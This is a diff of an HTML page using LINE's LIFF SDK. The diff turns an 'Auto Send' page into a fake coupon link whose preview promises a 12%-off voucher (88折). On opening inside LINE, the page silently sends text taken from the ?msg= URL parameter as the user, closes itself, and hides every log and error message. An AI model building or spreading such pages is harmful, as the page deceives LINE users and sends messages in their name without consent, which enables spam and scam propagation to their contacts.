@@ -2,99 +2,68 @@
 <html lang="zh-Hant">
 <head>
   <meta charset="utf-8">
-  <title>折價卷-連結</title>
+  <title>折價券－連結</title>
 
-  <!-- ========= 這一段決定「貼連結時」的預覽卡片 ========= -->
-  <!-- 必改：你的分享標題 -->
-  <meta property="og:title" content=<!doctype html>
-<html lang="zh-Hant">
-<head>
-  <meta charset="utf-8">
-  <title>折價卷-連結</title>
-
-  <!-- ========= 這一段決定「貼連結時」的預覽卡片 ========= -->
-  <!-- 必改：你的分享標題 -->
+  <!-- ====== Open Graph（決定貼連結時的預覽卡片）====== -->
+  <!-- TODO-1: 換成你想顯示的標題/描述 -->
   <meta property="og:title" content="限時折價券！點我領取 88 折好康">
-  <!-- 必改：你的分享描述（1~2 句內） -->
   <meta property="og:description" content="點開自動領取優惠，限時 3 天！先搶先贏！">
-  <!-- 必改：這個頁面部署後的「最終公開 URL」 -->
-  <meta property="og:url" content="https://your-domain.com/auto-send.html">
+
+  <!-- TODO-2: 換成這個頁面的「最終公開 URL」（部署後實際網址） -->
+  <meta property="og:url" content="https://YOUR-DOMAIN/auto-send.html">
   <meta property="og:type" content="website">
-  <!-- 必改：預覽縮圖（HTTPS、公開讀取；建議 1200×630） -->
-  <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRfFH5TMqF21XlLmSMJp_WF_pPOohCpOiRNtQ&s">
+
+  <!-- TODO-3: 換成你自己可公開讀取的 HTTPS 圖片（建議 1200×630） -->
+  <meta property="og:image" content="https://YOUR-DOMAIN/images/coupon-88.jpg">
   <meta property="og:image:width" content="1200">
   <meta property="og:image:height" content="630">
-  <meta property="og:image:alt" content="Auto Send 預覽圖">
+  <meta property="og:image:alt" content="折價券活動預覽圖">
 
-  <!-- （可選）Twitter Card，有些平台會用 -->
+  <!--（可選）Twitter Card，同步 OGP 即可 -->
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="Auto Send：一鍵把訊息送到 LINE">
-  <meta name="twitter:description" content="在 LINE 內開啟後，會自動把你指定的文字或圖卡送出。">
-  <meta name="twitter:image" content="https://your-domain.com/og/preview.jpg">
+  <meta name="twitter:title" content="限時折價券！點我領取 88 折好康">
+  <meta name="twitter:description" content="點開自動領取優惠，限時 3 天！先搶先贏！">
+  <meta name="twitter:image" content="https://YOUR-DOMAIN/images/coupon-88.jpg">
 
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
-    body { font:14px/1.5 -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial; padding:24px; }
-    #log { white-space: pre-wrap; }
-  </style>
-</head>
-<body>>
-  <!-- 必改：你的分享描述（1~2 句內） -->
-  <meta property="og:description" content="在 LINE 內開啟後，會自動把你指定的文字或圖卡送出。">
-  <!-- 必改：這個頁面部署後的「最終公開 URL」 -->
-  <meta property="og:url" content="https://your-domain.com/auto-send.html">
-  <meta property="og:type" content="website">
-  <!-- 必改：預覽縮圖（HTTPS、公開讀取；建議 1200×630） -->
-  <meta property="og:image" content="https://your-domain.com/og/preview.jpg">
-  <meta property="og:image:width" content="1200">
-  <meta property="og:image:height" content="630">
-  <meta property="og:image:alt" content="Auto Send 預覽圖">
-
-  <!-- （可選）Twitter Card，有些平台會用 -->
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="Auto Send：一鍵把訊息送到 LINE">
-  <meta name="twitter:description" content="在 LINE 內開啟後，會自動把你指定的文字或圖卡送出。">
-  <meta name="twitter:image" content="https://your-domain.com/og/preview.jpg">
-
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <style>
-    body { font:14px/1.5 -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial; padding:24px; }
-    #log { white-space: pre-wrap; }
+    /* 靜默模式：不顯示任何提示文字 */
+    #log { display:none !important; }
+    body { margin:0; }
   </style>
 </head>
 <body>
   <div id="log">初始化中…</div>
 
-  <!-- LIFF SDK（只影響「在 LINE 內開啟」時的動作，與預覽無關） -->
+  <!-- LIFF SDK -->
   <script src="https://static.line-scdn.net/liff/edge/2/sdk.js"></script>
   <script>
   (async () => {
-    const log = (...a) => (document.getElementById('log').innerText = a.join(' '));
     try {
-      // 必改：你的 LIFF ID（大小寫完全一致）
-      const LIFF_ID = "2008019441-GRwnZZ32";
-      log("LIFF init…");
+      const LIFF_ID = "2008019441-GRwnZZ32"; // 大小寫要完全一致
       await liff.init({ liffId: LIFF_ID });
 
-      // 不在 LINE 內就導回 LINE 開啟（這段保留）
+      // 不在 LINE 內就導回 LINE 開啟（讓 sendMessages 可用）
       if (!liff.isInClient()) {
-        log("不在 LINE 內，導回 LINE 開啟…");
         location.href = "line://app/" + LIFF_ID + location.search;
         return;
       }
 
-      // 讀取查詢參數（只影響送什麼訊息；不影響連結預覽）
-      const sp = new URL(location.href).searchParams;
+      // 讀取 ?msg= 查詢參數（沒有就用預設）
+      const sp  = new URL(location.href).searchParams;
       const msg = decodeURIComponent(sp.get("msg") || "我很聰明");
 
-      //log("送訊息中：", msg);
+      // 靜默送出訊息，不顯示任何 log
       await liff.sendMessages([{ type: "text", text: msg }]);
-      //log("已送出，關閉視窗");
+
+      // 關閉視窗
       try { liff.closeWindow(); } catch {}
     } catch (e) {
-      log("錯誤：", e && (e.message || e));
+      // 也不顯示錯誤，完全靜默；若你要偵錯再暫時打開 console
+      // console.error(e);
     }
   })();
   </script>
 </body>
 </html>
+
